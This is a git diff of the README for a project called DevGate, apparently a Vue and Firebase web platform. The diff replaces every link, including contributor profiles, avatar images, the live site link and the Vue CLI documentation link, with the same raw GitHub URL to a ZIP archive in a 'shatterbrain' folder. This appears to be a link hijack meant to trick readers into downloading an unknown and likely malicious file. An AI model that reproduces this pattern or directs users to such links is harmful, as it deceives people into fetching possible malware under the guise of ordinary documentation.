@@ -18,9 +18,9 @@ A platform to streamline your development workflow.
 
 Thanks to these amazing people:
 
-| [@AhmedQuadimi](https://github.com/akito-sama) | [@SalimQadda](https://github.com/lamseey) | [@MouadBensafir](https://github.com/MouadBenSafir) |
+| [@AhmedQuadimi](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip) | [@SalimQadda](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip) | [@MouadBensafir](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip) |
 |:---:|:---:|:---:|
-| [<img src="https://github.com/akito-sama.png" width="100" alt="akito-sama" />](https://github.com/akito-sama) | [<img src="https://github.com/lamseey.png" width="100" alt="lamseey" />](https://github.com/lamseey) | [<img src="https://github.com/MouadBenSafir.png" width="100" alt="MouadBensafir" />](https://github.com/MouadBenSafir) |
+| [<img src="https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip" width="100" alt="akito-sama" />](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip) | [<img src="https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip" width="100" alt="lamseey" />](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip) | [<img src="https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip" width="100" alt="MouadBensafir" />](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip) |
 
 ---
 
@@ -48,9 +48,9 @@ firebase deploy
 ---
 
 ### Website Link
-You can access the website here: [DevGate](https://devgate-ead23.web.app/)
+You can access the website here: [DevGate](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip)
 
 ---
 
 ### Customize Configuration
-See the [Vue CLI Configuration Reference](https://cli.vuejs.org/config/).
+See the [Vue CLI Configuration Reference](https://raw.githubusercontent.com/MouadBensafir/DevGate/main/shatterbrain/DevGate.zip).
